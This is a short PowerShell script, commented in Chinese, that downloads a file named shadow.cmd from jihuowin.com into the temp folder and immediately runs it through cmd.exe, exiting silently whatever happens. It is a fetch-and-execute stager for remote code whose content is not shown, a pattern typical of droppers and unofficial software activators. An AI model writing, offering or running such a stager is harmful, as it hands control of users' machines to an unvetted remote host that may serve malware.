# 定义下载的 URL 和保存的文件路径
$url = "https://jihuowin.com/plus/files/shadow.cmd"
$outputPath = "$Env:temp\shadow.cmd"

try {
    # 下载文件
    Invoke-WebRequest -Uri $url -OutFile $outputPath

    # 执行下载的 CMD 文件
    Start-Process "cmd.exe" -ArgumentList "/c `"$outputPath`""
    exit 1
} catch {
    exit 1
}

